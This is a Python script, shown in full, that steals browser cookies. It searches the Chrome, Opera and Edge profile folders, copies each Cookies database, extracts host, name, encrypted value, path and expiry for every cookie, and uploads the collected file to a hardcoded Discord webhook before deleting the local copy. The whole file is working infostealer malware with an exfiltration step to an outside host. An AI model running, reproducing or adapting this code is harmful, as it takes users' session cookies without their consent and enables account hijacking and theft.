import os
import sqlite3
import shutil
import requests

WEBHOOK_URL = 'https://discord.com/api/webhooks/1255615157221195877/OHNjGv4u3xNOUYvFF3W24s30Khg-RVVN9cEEbyVg9LYJOPsSmUQrp38cOofpFZQ8S8Xk'

def sendfile(path):
    files = {'file': open(path, 'rb')}
    try:
        response = requests.post(WEBHOOK_URL, files=files)
        if response.status_code == 200:
            print("Sent successfully.")
        else:
            print(f"Failed. Status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Failed: {e}")

def extract(browser, path):
    all_data = []
    for root, dirs, files in os.walk(path):
        for dir in dirs:
            db_path = os.path.join(root, dir, 'Cookies')
            try:
                if not os.path.exists(db_path):
                    continue
                
                filename = f'{browser}Cookies_{dir}.db'
                shutil.copyfile(db_path, filename)
                
                db = sqlite3.connect(filename)
                cursor = db.cursor()
                
                cursor.execute('SELECT host_key, name, encrypted_value, path, expires_utc FROM cookies')
                for row in cursor.fetchall():
                    host_key = row[0]
                    name = row[1]
                    encrypted_value = row[2]
                    path = row[3]
                    expires_utc = row[4]
                    all_data.append(f'Host: {host_key}\nName: {name}\nValue: {encrypted_value}\nPath: {path}\nExpires: {expires_utc}\n')
                
                cursor.close()
                db.close()
                os.remove(filename)
            except Exception as e:
                print(f"Error: {e}")
    
    return all_data

def main():
    all_data = []
    
    try:
        chrome_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data')
        if os.path.exists(chrome_path):
            all_data.extend(extract('Chrome', chrome_path))
    except Exception as e:
        print(f"Error: {e}")
    
    try:
        opera_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Opera Software')
        if os.path.exists(opera_path):
            all_data.extend(extract('Opera', opera_path))
    except Exception as e:
        print(f"Error: {e}")

    try:
        edge_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data')
        if os.path.exists(edge_path):
            all_data.extend(extract('Edge', edge_path))
    except Exception as e:
        print(f"Error: {e}")
    
    temp_path = 'cookies.txt'
    with open(temp_path, 'w', encoding='utf-8') as file:
        file.write("\n".join(all_data))
    
    if os.path.exists(temp_path):
        sendfile(temp_path)
        os.remove(temp_path)
    else:
        print("No data or failed.")

if __name__ == '__main__':
    main()
